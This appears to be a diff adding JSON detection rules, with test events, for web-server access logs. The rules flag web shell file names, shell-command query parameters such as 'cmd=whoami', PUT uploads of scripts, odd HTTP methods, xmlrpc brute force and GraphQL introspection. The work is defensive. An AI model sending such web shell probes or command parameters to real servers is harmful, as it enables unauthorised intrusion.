+      "name": "Request for a well-known web shell file name",
+      "description": "Requests for names used by public web shells (c99, r57, b374k, wso, indoxploit, filesman, cmdasp, aspxspy, ...) that the server answered 2xx.",
+      "tactic": "Persistence",
+      "technique": "T1505.003",
+      "technique_name": "Server Software Component: Web Shell",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "^status=2\\d\\d\\s"
+          },
+          {
+            "field": "path",
+            "op": "regex",
+            "pattern": "/(?:c99|r57|b374k|wso\\d?|indoxploit|filesman|cmdasp|aspxspy|jspspy|webshell|alfa-?shell)\\.(?:php|phtml|asp|aspx|jsp)$"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "webshell"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/images/c99.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=15 dec=0 target=/images/c99.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/x/wso.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=10 dec=0 target=/x/wso.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/tmp/cmdasp.aspx",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=16 dec=0 target=/tmp/cmdasp.aspx"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/c99.php",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=8 dec=0 target=/c99.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/wso2.html",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=15 dec=0 target=/docs/wso2.html"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/blog/webshell-detection.html",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=29 dec=0 target=/blog/webshell-detection.html"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-webshell-command-parameter",
+      "name": "Server-side script called with a shell command parameter",
+      "description": "A .php/.jsp/.asp script called with cmd=, exec= or similar carrying whoami, uname, ifconfig, pwd or id and answered 2xx: command execution through a web shell.",
+      "tactic": "Execution",
+      "technique": "T1059",
+      "technique_name": "Command and Scripting Interpreter",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "^status=2\\d\\d\\s"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "\\.(?:php|jsp|aspx?|ashx)\\?(?:[^ ]{0,100}&)?(?:cmd|exec|command|shell|run)=\\s*(?:whoami|uname|ifconfig|ipconfig|pwd|id|ls|dir)(?:\\s|$|;|\\|)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "webshell"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/uploads/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=25 dec=0 target=/uploads/a.php?cmd=whoami"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.jsp",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=18 dec=0 target=/a.jsp?x=1&exec=id"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/a.php?command=uname -a"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=17 dec=0 target=/a.php?cmd=whoami"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=24 dec=0 target=/a.php?cmd=identify_user"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=23 dec=0 target=/a.php?category=ls_home"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-upload-script-put",
+      "name": "HTTP PUT of a server-side script",
+      "description": "A PUT request for a .php, .jsp, .jspx, .asp(x) or .war path that the server accepted (2xx): the file-write primitive behind several Tomcat, IIS WebDAV and misconfigured-server compromises.",
+      "tactic": "Persistence",
+      "technique": "T1505.003",
+      "technique_name": "Server Software Component: Web Shell",
+      "severity": "high",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "operation",
+            "op": "in",
+            "patterns": [
+              "PUT"
+            ]
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "^status=2\\d\\d\\s"
+          },
+          {
+            "field": "path",
+            "op": "regex",
+            "pattern": "\\.(?:php[3-8s]?|jsp[xf]?|aspx?|war)(?:/|$)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "webshell",
+        "put"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "PUT",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/shell.jsp/",
+            "destination": "203.0.113.7",
+            "command": "status=201 bytes=512 len=11 dec=0 target=/shell.jsp/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "PUT",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=204 bytes=512 len=6 dec=0 target=/a.php"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "PUT",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=405 bytes=512 len=6 dec=0 target=/a.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "PUT",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/api/items/5",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/api/items/5"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=6 dec=0 target=/a.php"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-recon-unusual-method",
+      "name": "TRACE, TRACK, CONNECT or DEBUG request",
+      "description": "Methods that normal browsers and APIs do not send to a public web server: probes for cross-site tracing, open proxies and debug endpoints.",
+      "tactic": "Reconnaissance",
+      "technique": "T1595.002",
+      "technique_name": "Active Scanning: Vulnerability Scanning",
+      "severity": "low",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "operation",
+            "op": "in",
+            "patterns": [
+              "TRACE",
+              "TRACK",
+              "CONNECT",
+              "DEBUG"
+            ]
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "recon"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "TRACE",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=405 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "CONNECT",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "example.org:443",
+            "destination": "203.0.113.7",
+            "command": "status=400 bytes=512 len=15 dec=0 target=example.org:443"
+          },
+          {
+            "executable": "web:access",
+            "operation": "DEBUG",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=404 bytes=512 len=1 dec=0 target=/"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "OPTIONS",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=2 dec=0 target=/a"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-recon-malformed-request-line",
+      "name": "Request line that is not HTTP",
+      "description": "The logged request line is not METHOD target: TLS handshakes sent to a plain HTTP port, binary protocol probes and garbage. Usually internet-wide scanners.",
+      "tactic": "Reconnaissance",
+      "technique": "T1595.002",
+      "technique_name": "Active Scanning: Vulnerability Scanning",
+      "severity": "low",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "operation",
+            "op": "equals",
+            "pattern": "INVALID"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "recon"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "INVALID",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "\\x16\\x03\\x01\\x02",
+            "destination": "203.0.113.7",
+            "command": "status=400 bytes=512 len=16 dec=0 target=\\x16\\x03\\x01\\x02"
+          },
+          {
+            "executable": "web:access",
+            "operation": "INVALID",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "SSH-2.0-libssh",
+            "destination": "203.0.113.7",
+            "command": "status=400 bytes=512 len=14 dec=0 target=SSH-2.0-libssh"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=1 dec=0 target=/"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=2 dec=0 target=/a"
+          },
+          {
+            "executable": "web:access",
+            "operation": "HEAD",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/a",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=2 dec=0 target=/a"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-brute-xmlrpc-post",
+      "name": "POST to WordPress xmlrpc.php",
+      "description": "xmlrpc.php accepts system.multicall, which lets one request try many passwords; POSTs to it are a common brute-force and amplification path.",
+      "tactic": "Credential Access",
+      "technique": "T1110",
+      "technique_name": "Brute Force",
+      "severity": "medium",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "operation",
+            "op": "in",
+            "patterns": [
+              "POST"
+            ]
+          },
+          {
+            "field": "path",
+            "op": "regex",
+            "pattern": "/xmlrpc\\.php$"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "bruteforce"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/xmlrpc.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=11 dec=0 target=/xmlrpc.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/blog/xmlrpc.php",
+            "destination": "203.0.113.7",
+            "command": "status=403 bytes=512 len=16 dec=0 target=/blog/xmlrpc.php"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/xmlrpc.php",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=11 dec=0 target=/xmlrpc.php"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/xmlrpc.php.bak",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=15 dec=0 target=/xmlrpc.php.bak"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/xmlrpc",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/docs/xmlrpc"
+          }
+        ]
+      }
+    },
+    {
+      "id": "web-recon-graphql-introspection",
+      "name": "GraphQL introspection query",
+      "description": "A request value containing __schema or an introspection query enumerates the whole API schema. Common for scanners, also used by legitimate tooling against non-production APIs.",
+      "tactic": "Reconnaissance",
+      "technique": "T1595.002",
+      "technique_name": "Active Scanning: Vulnerability Scanning",
+      "severity": "low",
+      "os": "any",
+      "event_type": "process",
+      "match": {
+        "all": [
+          {
+            "field": "executable",
+            "op": "equals",
+            "pattern": "web:access"
+          },
+          {
+            "field": "command",
+            "op": "regex",
+            "pattern": "(?:__schema\\b|introspectionquery\\b)"
+          }
+        ]
+      },
+      "tags": [
+        "web-access",
+        "graphql",
+        "api"
+      ],
+      "batch": "web-access-v1",
+      "tests": {
+        "positive": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/graphql",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=38 dec=0 target=/graphql?query={__schema{types{name}}}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/graphql",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=75 dec=0 target=/graphql?query=query IntrospectionQuery { __schema { queryType { name } } }"
+          }
+        ],
+        "negative": [
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/graphql",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=33 dec=0 target=/graphql?query={user(id:1){name}}"
+          },
+          {
+            "executable": "web:access",
+            "operation": "GET",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/docs/schema",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=12 dec=0 target=/docs/schema"
+          },
+          {
+            "executable": "web:access",
+            "operation": "POST",
+            "parent_exe": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36",
+            "path": "/graphql",
+            "destination": "203.0.113.7",
+            "command": "status=200 bytes=512 len=8 dec=0 target=/graphql"
+          }
+        ]
+      }
+    }
+  ]
+}
